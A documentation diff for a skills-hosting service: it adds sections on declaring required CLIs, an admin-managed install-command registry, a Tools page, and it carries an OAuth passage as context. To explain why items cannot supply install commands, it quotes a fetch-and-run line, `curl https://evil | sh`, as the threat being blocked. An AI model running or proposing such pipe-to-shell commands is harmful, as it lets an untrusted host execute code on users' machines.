@@ -243,6 +243,29 @@ Use a key restricted to the groups you want installed: the key ends up inside ea
 
 A group whose plugin cannot be built (two members with the same kind and name from different owners, which the plugin layout cannot separate with "Install as", or over 100 MB) is left out of the marketplace and `plugin.zip` answers 409 `path_conflict` / 413. The manifest reports it as `plugin: {ok: false, problem}`, the group page's Plugin tab shows the reason and its "Download plugin.zip" button is disabled with it.
 
+## Declaring required CLIs
+
+A skill that needs a command-line tool on the user's machine names it in its frontmatter, under `metadata` (the portable spelling: claude.ai and the Skills API reject unknown top-level keys):
+
+```yaml
+---
+name: review-loop
+description: Review every commit with roborev.
+metadata:
+  requires: [roborev, stax]
+---
+```
+
+A top-level `requires: [context-builder]` is accepted too, for skills that already use it; lint suggests moving it under `metadata`. Names match `^[a-z0-9][a-z0-9._-]{0,63}$` (others are a lint warning and ignored), at most 50 per version. Lint lists the CLIs it found (`requires.found`).
+
+The group page shows a **Requires** panel listing every CLI the group's effective members need (included groups too, at each member's pinned version), which items need it, and, for a CLI in the instance's tool registry, its install command per platform (macOS, Linux, Windows) with a copy button, an "install all" block (one command per line, so one failure does not hide the rest) and a one-liner that prints which binaries are missing. `GET /api/v1/groups/<slug>` returns the same list as `requires: [{name, items, tool: {homepage, check, install} | null, sources?}]`; the MCP `get_group` and `get_bundle` tools carry it too, so an agent can tell the user what to install first.
+
+Install commands come only from the registry, which admins keep on `/admin/settings` (CLI tools card; `GET`/`POST /api/v1/admin/cli-tools`, `PUT`/`DELETE /api/v1/admin/cli-tools/<name>`, 404 for everyone else, every change audited with its commands). An item never supplies one: a `metadata.install` field is ignored, because readers paste these commands into a terminal and any public group could otherwise show `curl https://evil | sh` under a friendly name. A CLI not in the registry is listed with no command, plus the GitHub repository the requiring item was imported from. SCP never runs any of these commands. The registry starts empty.
+
+### Tools
+
+The **Tools** page (`/tools`, in the main nav) lists every registry row on its own, without opening a group: one card per tool with a platform switcher, its install command and a check one-liner (`command -v <bin>` / `Get-Command <bin>`) with copy buttons, its homepage, and "Used by" links to the items and groups you can read whose skills require it (never another user's private ones). A tool with no install command shows "No install command recorded" and its homepage. The tool itself never becomes an item: SCP stores skills and Markdown, never executables; a tool's companion skill or plugin imports as items as usual. Admins edit, add and remove rows inline on the same page. API: `GET /api/v1/tools`, `GET /api/v1/tools/<name>` (any signed-in user); MCP: the `scp://tools` resource returns the same rows.
+
 ## OAuth for hosted MCP clients
 
 Hosted MCP hosts (Claude.ai, Claude Desktop, ChatGPT, VS Code, Claude Code without a pasted key) can connect to `/mcp` or `/mcp/<group>` with OAuth 2.1 instead of an API key. Point the host at the MCP URL and it does the rest: the 401 carries `WWW-Authenticate: Bearer resource_metadata=...`, the host reads `/.well-known/oauth-protected-resource` and `/.well-known/oauth-authorization-server`, registers itself (dynamic client registration, anonymous, 20 per hour per IP; a registration nobody ever consents to is dropped after 7 days and the host simply registers again, while a consented one is kept however long its tokens have been gone, so the client id the host stored keeps working), and opens `/oauth/authorize` in your browser. You sign in if needed, land on the **Authorize** page, pick the permissions (`read` always, `write` optional) and either every group you can read or specific groups, and approve. The host exchanges the code for tokens and connects.
